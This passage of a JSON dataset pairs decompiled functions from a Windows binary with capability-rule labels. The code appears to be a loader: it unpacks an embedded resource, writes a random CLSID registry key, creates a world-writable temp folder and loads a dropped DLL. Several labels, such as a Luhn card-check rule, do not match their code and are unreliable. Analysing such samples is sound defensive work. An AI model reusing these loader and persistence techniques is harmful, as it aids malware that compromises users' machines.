1;\n            iVar7 = 2;\n            while( true ) {\n                bVar10 = CARRY1(uVar6, uVar6);\n                uVar6 = uVar6 * '\\x02';\n                if (uVar6 == 0) {\n                    bVar10 = iStack36 == 0;\n                    iStack36 = iStack36 + -1;\n                    if (bVar10) goto code_r0x004029fa;\n                    uVar6 = *param_3;\n                    param_3 = param_3 + 1;\n                    bVar10 = CARRY1(uVar6, uVar6);\n                    uVar6 = uVar6 * '\\x02' + 1;\n                }\n                if (!bVar10) break;\n                bVar10 = CARRY1(uVar6, uVar6);\n                uVar6 = uVar6 * '\\x02';\n                if (uVar6 == 0) {\n                    bVar10 = iStack36 == 0;\n                    iStack36 = iStack36 + -1;\n                    if (bVar10) goto code_r0x004029fa;\n                    uVar6 = *param_3;\n                    param_3 = param_3 + 1;\n                    bVar10 = CARRY1(uVar6, uVar6);\n                    uVar6 = uVar6 * '\\x02' + 1;\n                }\n                if (bVar10) {\n                    bVar10 = CARRY1(uVar6, uVar6);\n                    uVar6 = uVar6 * '\\x02';\n                    if (uVar6 == 0) {\n                        bVar10 = iStack36 == 0;\n                        iStack36 = iStack36 + -1;\n                        if (bVar10) goto code_r0x004029fa;\n                        uVar6 = *param_3;\n                        param_3 = param_3 + 1;\n                        bVar10 = CARRY1(uVar6, uVar6);\n                        uVar6 = uVar6 * '\\x02' + 1;\n                    }\n                    if (bVar10) {\n                        bVar10 = CARRY1(uVar6, uVar6);\n                        uVar6 = uVar6 * '\\x02';\n                        if (uVar6 == 0) {\n                            bVar10 = iStack36 == 0;\n                            iStack36 = iStack36 + -1;\n                            if (bVar10) goto code_r0x004029fa;\n                            uVar6 = *param_3;\n                            param_3 = param_3 + 1;\n                            bVar10 = CARRY1(uVar6, uVar6);\n                            uVar6 = uVar6 * '\\x02' + 1;\n                        }\n                        bVar11 = CARRY1(uVar6, uVar6);\n                        uVar6 = uVar6 * '\\x02';\n                        if (uVar6 == 0) {\n                            bVar11 = iStack36 == 0;\n                            iStack36 = iStack36 + -1;\n                            if (bVar11) goto code_r0x004029fa;\n                            uVar6 = *param_3;\n                            param_3 = param_3 + 1;\n                            bVar11 = CARRY1(uVar6, uVar6);\n                            uVar6 = uVar6 * '\\x02' + 1;\n                        }\n                        bVar12 = CARRY1(uVar6, uVar6);\n                        uVar6 = uVar6 * '\\x02';\n                        if (uVar6 == 0) {\n                            bVar12 = iStack36 == 0;\n                            iStack36 = iStack36 + -1;\n                            if (bVar12) goto code_r0x004029fa;\n                            uVar6 = *param_3;\n                            param_3 = param_3 + 1;\n                            bVar12 = CARRY1(uVar6, uVar6);\n                            uVar6 = uVar6 * '\\x02' + 1;\n                        }\n                        bVar13 = CARRY1(uVar6, uVar6);\n                        uVar6 = uVar6 * '\\x02';\n                        if (uVar6 == 0) {\n                            bVar13 = iStack36 == 0;\n                            iStack36 = iStack36 + -1;\n                            if (bVar13) goto code_r0x004029fa;\n                            uVar6 = *param_3;\n                            param_3 = param_3 + 1;\n                            bVar13 = CARRY1(uVar6, uVar6);\n                            uVar6 = uVar6 * '\\x02' + 1;\n                        }\n                        uVar4 = ((bVar10 * 2 + bVar11) * 2 + bVar12) * 2 + bVar13;\n                        if (uVar4 != 0) {\n                            if (param_6 - uStack40 < uVar4) goto code_r0x004029fa;\n                            uVar4 = puVar9[-uVar4];\n                        }\n                        bVar10 = uStack40 == 0;\n                        uStack40 = uStack40 - 1;\n                        if (bVar10) goto code_r0x004029fa;\n                        *puVar9 = uVar4;\n                        puVar9 = puVar9 + 1;\n                        iVar7 = 2;\n                    }\n                    else {\n                        bVar10 = iStack36 == 0;\n                        iStack36 = iStack36 + -1;\n                        if (bVar10) goto code_r0x004029fa;\n                        uVar1 = *param_3;\n                        param_3 = param_3 + 1;\n                        uVar3 = uVar1 >> 1;\n                        unaff_EBP = uVar3;\n                        if (uVar3 == 0) {\n                            return CONCAT44(param_2, puVar9 - param_5);\n                        }\n                        uVar4 = ((uVar1 & 1) != 0) + 2;\n                        if ((param_6 - uStack40 < unaff_EBP) ||\n                           (bVar10 = uStack40 < uVar4,  uStack40 = uStack40 - uVar4,  bVar10)) goto code_r0x004029fa;\n                        puVar8 = puVar9 + -unaff_EBP;\n                        for (; uVar4 != 0; uVar4 = uVar4 - 1) {\n                            *puVar9 = *puVar8;\n                            puVar8 = puVar8 + 1;\n                            puVar9 = puVar9 + 1;\n                        }\n                        iVar7 = 1;\n                    }\n                }\n                else {\n                    uVar4 = 1;\n                    do {\n                        bVar10 = CARRY1(uVar6, uVar6);\n                        uVar6 = uVar6 * '\\x02';\n                        if (uVar6 == 0) {\n                            bVar10 = iStack36 == 0;\n                            iStack36 = iStack36 + -1;\n                            if (bVar10) goto code_r0x004029fa;\n                            uVar6 = *param_3;\n                            param_3 = param_3 + 1;\n                            bVar10 = CARRY1(uVar6, uVar6);\n                            uVar6 = uVar6 * '\\x02' + 1;\n                        }\n                        bVar11 = CARRY4(uVar4, uVar4);\n                        uVar2 = uVar4 * 2;\n                        uVar4 = uVar2 + bVar10;\n                        if (bVar11 || CARRY4(uVar2, bVar10)) goto code_r0x004029fa;\n                        bVar10 = CARRY1(uVar6, uVar6);\n                        uVar6 = uVar6 * '\\x02';\n                        if (uVar6 == 0) {\n                            bVar10 = iStack36 == 0;\n                            iStack36 = iStack36 + -1;\n                            if (bVar10) goto code_r0x004029fa;\n                            uVar6 = *param_3;\n                            param_3 = param_3 + 1;\n                            bVar10 = CARRY1(uVar6, uVar6);\n                            uVar6 = uVar6 * '\\x02' + 1;\n                        }\n                    } while (bVar10);\n                    iVar5 = uVar4 - iVar7;\n                    iVar7 = 1;\n                    if (iVar5 == 0) {\n                        uVar4 = 1;\n                        do {\n                            bVar10 = CARRY1(uVar6, uVar6);\n                            uVar6 = uVar6 * '\\x02';\n                            if (uVar6 == 0) {\n                                bVar10 = iStack36 == 0;\n                                iStack36 = iStack36 + -1;\n                                if (bVar10) goto code_r0x004029fa;\n                                uVar6 = *param_3;\n                                param_3 = param_3 + 1;\n                                bVar10 = CARRY1(uVar6, uVar6);\n                                uVar6 = uVar6 * '\\x02' + 1;\n                            }\n                            bVar11 = CARRY4(uVar4, uVar4);\n                            uVar2 = uVar4 * 2;\n                            uVar4 = uVar2 + bVar10;\n                            if (bVar11 || CARRY4(uVar2, bVar10)) goto code_r0x004029fa;\n                            bVar10 = CARRY1(uVar6, uVar6);\n                            uVar6 = uVar6 * '\\x02';\n                            if (uVar6 == 0) {\n                                bVar10 = iStack36 == 0;\n                                iStack36 = iStack36 + -1;\n                                if (bVar10) goto code_r0x004029fa;\n                                uVar6 = *param_3;\n                                param_3 = param_3 + 1;\n                                bVar10 = CARRY1(uVar6, uVar6);\n                                uVar6 = uVar6 * '\\x02' + 1;\n                            }\n                        } while (bVar10);\n                        if ((param_6 - uStack40 < unaff_EBP) ||\n                           (bVar10 = uStack40 < uVar4,  uStack40 = uStack40 - uVar4,  bVar10)) goto code_r0x004029fa;\n                        puVar8 = puVar9 + -unaff_EBP;\n                        for (; uVar4 != 0; uVar4 = uVar4 - 1) {\n                            *puVar9 = *puVar8;\n                            puVar8 = puVar8 + 1;\n                            puVar9 = puVar9 + 1;\n                        }\n                    }\n                    else {\n                        uVar4 = iVar5 - 1;\n                        if (((uVar4 & 0xff000000) != 0) || (bVar10 = iStack36 == 0,  iStack36 = iStack36 + -1,  bVar10))\n                        goto code_r0x004029fa;\n                        unaff_EBP = CONCAT31(uVar4, *param_3);\n                        param_3 = param_3 + 1;\n                        uVar4 = 1;\n                        do {\n                            bVar10 = CARRY1(uVar6, uVar6);\n                            uVar6 = uVar6 * '\\x02';\n                            if (uVar6 == 0) {\n                                bVar10 = iStack36 == 0;\n                                iStack36 = iStack36 + -1;\n                                if (bVar10) goto code_r0x004029fa;\n                                uVar6 = *param_3;\n                                param_3 = param_3 + 1;\n                                bVar10 = CARRY1(uVar6, uVar6);\n                                uVar6 = uVar6 * '\\x02' + 1;\n                            }\n                            bVar11 = CARRY4(uVar4, uVar4);\n                            uVar2 = uVar4 * 2;\n                            uVar4 = uVar2 + bVar10;\n                            if (bVar11 || CARRY4(uVar2, bVar10)) goto code_r0x004029fa;\n                            bVar10 = CARRY1(uVar6, uVar6);\n                            uVar6 = uVar6 * '\\x02';\n                            if (uVar6 == 0) {\n                                bVar10 = iStack36 == 0;\n                                iStack36 = iStack36 + -1;\n                                if (bVar10) goto code_r0x004029fa;\n                                uVar6 = *param_3;\n                                param_3 = param_3 + 1;\n                                bVar10 = CARRY1(uVar6, uVar6);\n                                uVar6 = uVar6 * '\\x02' + 1;\n                            }\n                        } while (bVar10);\n                        uVar4 = (((uVar4 - (unaff_EBP < 32000)) + 2) - (unaff_EBP < 0x500)) + (unaff_EBP < 0x80) +\n                                (unaff_EBP < 0x80);\n                        if ((param_6 - uStack40 < unaff_EBP) ||\n                           (bVar10 = uStack40 < uVar4,  uStack40 = uStack40 - uVar4,  bVar10)) goto code_r0x004029fa;\n                        puVar8 = puVar9 + -unaff_EBP;\n                        for (; uVar4 != 0; uVar4 = uVar4 - 1) {\n                            *puVar9 = *puVar8;\n                            puVar8 = puVar8 + 1;\n                            puVar9 = puVar9 + 1;\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x004029fa:\n    return CONCAT44(param_2, 0xffffffff);\n}\n",
        "token_count": 3338
    },
    "0040120f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040120f(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n    return;\n}\n",
        "token_count": 167
    },
    "004013d2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004013d2(int32_t param_1, char *param_2, uint32_t param_3)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    \n    *(param_1 + 0x428) = 0;\n    if (*param_2 == '\\0') {\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n        return;\n    }\n    if (0xf < param_3) {\n        param_3 = 0xf;\n    }\n    pcVar2 = param_2 + -param_3;\n    do {\n        if (*param_2 == *pcVar2) {\n            if (param_3 != 0) {\n                piVar1 = param_1 + 0x41c;\n                *piVar1 = *piVar1 + -1;\n                if (*piVar1 == 0) {\n                    *(param_1 + 0x418) = *(param_1 + 0x410);\n                    *(param_1 + 0x41c) = 8;\n                    *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n                }\n                **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n                piVar1 = param_1 + 0x41c;\n                *piVar1 = *piVar1 + -1;\n                if (*piVar1 == 0) {\n                    *(param_1 + 0x418) = *(param_1 + 0x410);\n                    *(param_1 + 0x41c) = 8;\n                    *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n                }\n                **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n                piVar1 = param_1 + 0x41c;\n                *piVar1 = *piVar1 + -1;\n                if (*piVar1 == 0) {\n                    *(param_1 + 0x418) = *(param_1 + 0x410);\n                    *(param_1 + 0x41c) = 8;\n                    *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n                }\n                **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n                fcn.004011cc(param_3 & 8);\n                fcn.004011cc(param_3 & 4);\n                fcn.004011cc(param_3 & 2);\n                fcn.004011cc(param_3 & 1);\n                return;\n            }\n            break;\n        }\n        param_3 = param_3 - 1;\n        pcVar2 = pcVar2 + 1;\n    } while (param_3 != 0);\n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n    **(param_1 + 0x410) = *param_2;\n    *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    return;\n}\n",
        "token_count": 1803
    },
    "00403920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403920(uint arg_8h, uint ARG_0)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    \n    uVar1 = fcn.00403889(arg_8h);\n    uVar2 = fcn.00403889(arg_8h);\n    uVar3 = fcn.00403889(arg_8h);\n    uVar4 = fcn.00403889(arg_8h);\n    uVar5 = fcn.00403889(arg_8h);\n    uVar6 = fcn.00403889(arg_8h);\n    uVar7 = fcn.00403889(arg_8h);\n    uVar8 = fcn.00403889(arg_8h);\n    (*_sym.imp.USER32.dll_wsprintfA)\n              (ARG_0, \"{%0.4X%0.4X-%0.4X-%0.4X-%0.4X-%0.4X%0.4X%0.4X}\", uVar1, uVar2, uVar3, uVar4 & 0xfff | 0x4000, \n               uVar5 % 0x3fff + 0x8000, uVar6, uVar7, uVar8);\n    return;\n}\n",
        "token_count": 323
    },
    "00402b54": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402b54(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint in_EDX;\n    uint32_t uVar4;\n    uint var_28h;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n    uVar4 = 0;\n    var_4h = in_EDX;\n    while( true ) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x104, arg_ch);\n        if (iVar2 == 0) {\n            return 0;\n        }\n        fcn.00403a3a(0, 8, 0xb, &var_28h);\n        (*pcVar1)(arg_ch, &var_28h);\n        uVar3 = fcn.00403c99();\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateDirectoryW)(arg_ch, uVar3);\n        if (iVar2 != 0) break;\n        uVar4 = uVar4 + 1;\n        if (4 < uVar4) {\n            return 0;\n        }\n    }\n    (*pcVar1)(arg_ch, 0x40566c);\n    (*pcVar1)(arg_ch, arg_8h);\n    (*pcVar1)(arg_ch, 0x405670);\n    uVar3 = fcn.00403c56(arg_ch, var_8h, var_4h, 1);\n    return uVar3;\n}\n",
        "token_count": 358
    },
    "00403c99": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.00403c99(void)\n\n{\n    uint32_t uVar1;\n    \n    if (*0x4070a0 != 0xc) {\n        *0x4070a0 = 0xc;\n        *0x4070a8 = 0;\n        uVar1 = fcn.00403700();\n        if (uVar1 < 6) {\n            (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)\n                      (\"D:(A;OICI;GA;;;WD)\", 1, 0x4070a4, 0);\n        }\n        else {\n            (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)\n                      (\"S:(ML;;NW;;;LW)\", 1, 0x4070a4, 0);\n        }\n    }\n    return 0x4070a0;\n}\n",
        "token_count": 196
    },
    "null": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid entry0(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint lpFilename;\n    \n    *0x4070b0 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(*0x4070b0, &lpFilename, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    fcn.00403700();\n    fcn.0040371b();\n    fcn.00403733();\n    uVar1 = fcn.00403700();\n    if (uVar1 < 6) goto code_r0x00402e50;\n    uVar1 = fcn.0040353c();\n    if (0x1fff < uVar1) goto code_r0x00402e50;\n    iVar2 = fcn.00402d64();\n    if (iVar2 == 0) goto code_r0x00402e50;\n    uVar3 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(uVar3);\ncode_r0x00402e50:\n        uVar3 = fcn.00402c67();\n    } while( true );\n}\n",
        "token_count": 282
    },
    "00402e58": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.00402e58(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint lpBuffer;\n    uint pActCtx;\n    uint var_20h;\n    char *var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = fcn.00403700();\n    if (5 < uVar1) {\n        var_ch = 0;\n        var_8h = 0;\n        var_18h = 0;\n        var_14h = &lpBuffer;\n        pActCtx = 0x20;\n        var_20h = 0x1c;\n        var_1ch = \"shell32.dll\";\n        var_10h = 0x7c;\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(var_14h, 0x104);\n        uVar2 = (*_sym.imp.KERNEL32.dll_CreateActCtxA)(&pActCtx, &var_4h);\n        (*_sym.imp.KERNEL32.dll_ActivateActCtx)(uVar2);\n    }\n    return;\n}\n",
        "token_count": 282
    },
    "00403465": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403465(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint in_EDX;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    cVar3 = (*_sym.imp.KERNEL32.dll_GetUserDefaultUILanguage)();\n    iVar5 = 0;\n    uVar4 = 0;\n    do {\n        iVar2 = iVar5;\n        if (*(uVar4 + 0x407000) == cVar3) break;\n        uVar4 = uVar4 + 0x44;\n        iVar5 = iVar5 + 1;\n        iVar2 = *0x407094;\n    } while (uVar4 < 0x88);\n    *0x407094 = iVar2;\n    *0x407090 = arg_8h;\n    *0x407088 = in_EDX;\n    fcn.00402e58();\n    (*_sym.imp.COMCTL32.dll_InitCommonControls)();\n    pcVar1 = _sym.imp.USER32.dll_DialogBoxParamW;\n    (*_sym.imp.USER32.dll_DialogBoxParamW)();\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 273
    },
    "00403700": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t __fastcall fcn.00403700(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0040366c(param_1);\n    return uVar1 >> 8 & 0xff;\n}\n",
        "token_count": 80
    },
    "0040371b": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuchar __fastcall fcn.0040371b(uint param_1)\n\n{\n    uchar uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0040366c(param_1);\n    return uVar1;\n}\n",
        "token_count": 70
    },
    "00403c56": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403c56(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t hFile;\n    uint uVar1;\n    uint var_8h;\n    uint hObject;\n    \n    hFile = fcn.00403bd5(arg_8h, arg_14h);\n    if (hFile == -1) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00403c12(hFile, arg_ch, arg_10h);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hFile);\n    }\n    return uVar1;\n}\n",
        "token_count": 150
    },
    "0040123e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040123e(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n    return;\n}\n",
        "token_count": 173
    },
    "00401379": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401379(char *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *pcVar5;\n    \n    if (0xf < param_2) {\n        param_2 = 0xf;\n    }\n    pcVar5 = param_1 + -param_2;\n    iVar1 = 0;\n    do {\n        uVar3 = param_2;\n        pcVar4 = pcVar5;\n        if (*param_1 == '\\0') {\n            iVar2 = iVar1 + 7;\n        }\n        else {\n            do {\n                if (*param_1 == *pcVar4) break;\n                uVar3 = uVar3 - 1;\n                pcVar4 = pcVar4 + 1;\n            } while (uVar3 != 0);\n            iVar2 = iVar1 + 7;\n            if (uVar3 == 0) {\n                iVar2 = iVar1 + 9;\n            }\n        }\n        param_1 = param_1 + 1;\n        pcVar5 = pcVar5 + 1;\n        param_3 = param_3 + -1;\n        iVar1 = iVar2;\n        if (param_3 == 0) {\n            return iVar2;\n        }\n    } while( true );\n}\n",
        "token_count": 313
    },
    "00402a80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00402a80(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t hKey;\n    uint lpFilename;\n    uint var_104h;\n    uint var_edh;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(param_1, &lpFilename, 0x104);\n    if (iVar1 != 0) {\n        var_4h = fcn.004037d6();\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(&var_104h, \"SOFTWARE\\\\Classes\\\\CLSID\\\\\");\n        fcn.00403920(&var_4h, &var_edh);\n        fcn.00403920(&var_4h, &var_edh);\n        fcn.00403920(&var_4h, &var_edh);\n        fcn.00403920(&var_4h, &var_edh);\n        hKey = fcn.00403ddb(0x80000001, &var_104h, 0x2011f);\n        iVar1 = hKey;\n        if (hKey != 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpFilename);\n            iVar1 = fcn.00403e8c(hKey, 0x405668, &lpFilename, iVar1 + 1);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 338
    },
    "00402c67": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00402c67(void)\n\n{\n    code *pcVar1;\n    uint hModule;\n    int32_t iVar2;\n    uint var_438h;\n    uint lpLibFileName;\n    uint var_28h;\n    uint var_8h;\n    uint var_4h;\n    \n    hModule = *0x4070b0;\n    iVar2 = fcn.00402a80();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar2 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    iVar2 = fcn.00403cf1(hModule, 10, 0x65, &var_4h);\n    if (iVar2 == 0) {\n        (*pcVar1)();\n    }\n    else {\n        iVar2 = fcn.00403ec3(var_4h, iVar2, &var_8h, 0);\n        fcn.004040e0(var_4h);\n        if (iVar2 != 0) {\n            fcn.00403a3a(0, 8, 0xb, &var_28h);\n            iVar2 = fcn.00402b54(&var_28h, &var_438h);\n            if ((iVar2 != 0) && (iVar2 = fcn.00402be0(),  iVar2 != 0)) {\n                iVar2 = fcn.00403b5c(&var_28h, &lpLibFileName);\n                if (iVar2 == 0) {\n                    (*pcVar1)();\n                }\n                iVar2 = fcn.00402c2a();\n                if (iVar2 != 0) {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(&lpLibFileName);\n                    if (iVar2 != 0) {\n                        return 0;\n                    }\n                    iVar2 = (*pcVar1)();\n                    if (iVar2 == 0x45a) {\n                        return 1;\n                    }\n                    (*pcVar1)();\n                    return 0;\n                }\n            }\n            (*pcVar1)();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 469
    },
    "00402ec6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402ec6(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t lpvObject;\n    uint var_64h;\n    int32_t lptm;\n    \n    iVar1 = (*_sym.imp.USER32.dll_GetDlgItem)(param_1, 0xfb94);\n    if ((iVar1 != 0) && (iVar2 = (*_sym.imp.USER32.dll_SendMessageW)(iVar1, 0x31, 0, 0),  iVar2 != 0)) {\n        (*_sym.imp.GDI32.dll_GetObjectA)(iVar2, 0x3c, &lpvObject);\n        uVar3 = (*_sym.imp.USER32.dll_GetDC)(iVar1);\n        (*str.pOUv._0_4_)(uVar3, iVar2);\n        (**0x405038)(uVar3, &lptm);\n        lpvObject = lptm + 4;\n        var_64h = 700;\n        uVar3 = (*_sym.imp.GDI32.dll_CreateFontIndirectA)(&lpvObject);\n        (*_sym.imp.USER32.dll_SendMessageW)(iVar1, 0x30, uVar3, 1);\n    }\n    return;\n}\n",
        "token_count": 289
    },
    "004031bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
